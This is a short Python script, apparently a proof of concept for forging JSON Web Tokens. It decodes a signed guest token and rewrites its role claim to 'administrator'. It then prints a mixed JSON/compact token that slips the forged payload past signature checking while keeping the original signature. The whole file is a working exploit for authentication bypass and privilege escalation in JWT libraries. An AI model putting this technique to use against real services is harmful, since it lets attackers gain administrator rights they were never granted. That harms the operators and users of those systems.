from json import dumps, loads
from jwcrypto.common import base64url_decode, base64url_encode

""" Make a forged token """
""" Use mix of JSON and compact format to insert forged claims including long expiration """


[header, payload, signature] = 'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA0MTQ1NDEsImlhdCI6MTcxMDQxMDk0MSwianRpIjoiRXFYa1JlM0taVm5MY2tmUG13VVpJUSIsIm5iZiI6MTcxMDQxMDk0MSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.dindR6sdLUdJD7Q6y-Ut8XDx0-XTVKGDzI1YVd-7fMkFydE4M-8O4cltoh6KjmiArJNQrkf1cTzFgT0I6hNC0apMMz7f350e7ph5_0DWONnkuFvSuUxkVvsYwm-OuKIIW3NA2U0pGR7xJphGedcwLKel1IaR-XA9bLox4Xo96Nf_XeGn_NuOfKsKhtha5jjPYfcsxoPjpFiQvnWyupM5Tpg7ySUY3lM4c2fuRImdpejzpVqJfD9B0NAfOAw6dUalvoU_LCZYkzluOIncszohluDAGXOIwvK_2c4B0zTUanDcMYxmHIUGfXGQ07-7DGXoC5bnubVQYkr3x_QcNfUdug'.split('.')

parsed_payload = loads(base64url_decode(payload))
parsed_payload['role'] = 'administrator'

fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))

print('{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}')
